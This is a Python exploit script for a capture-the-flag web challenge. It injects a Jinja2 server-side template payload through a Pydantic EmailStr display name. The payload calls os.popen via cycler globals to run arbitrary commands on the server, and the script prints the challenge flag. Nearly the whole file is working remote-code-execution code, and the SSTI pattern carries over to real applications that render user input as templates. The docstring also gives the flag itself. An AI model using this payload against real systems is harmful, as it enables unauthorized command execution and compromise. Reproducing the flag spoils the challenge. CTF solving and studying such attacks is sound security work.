#!/usr/bin/env python3
"""
Jinja — SSTI via Pydantic EmailStr bypass
0xFun CTF 2026 — Web

Pydantic EmailStr accepts "Display Name" <email@domain.com> (RFC 5322).
The server injects the email directly into jinja2.Template() without sanitizing.
Using the format "(PAYLOAD)" <t@g.com>, SSTI is injected with parentheses.

Flag: 0xfun{Z3r0_7ru57_R3nd3r}

notes: reused or stolen challenge - https://fayred.fr/en/writeups/heroctf-2024-jinjatic/

"""
import requests
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://chall.0xfun.org:44355"


def rce(cmd):
    payload = '{{cycler.__init__.__globals__.os.popen("' + cmd + '").read()}}'
    email = f'"({payload})" <t@g.com>'
    r = requests.post(f"{URL}/render", data={"email": email})
    start = r.text.find('"(') + 2
    end = r.text.find(')"', start)
    return r.text[start:end] if start > 1 and end > start else r.text


print(rce("/getflag"))
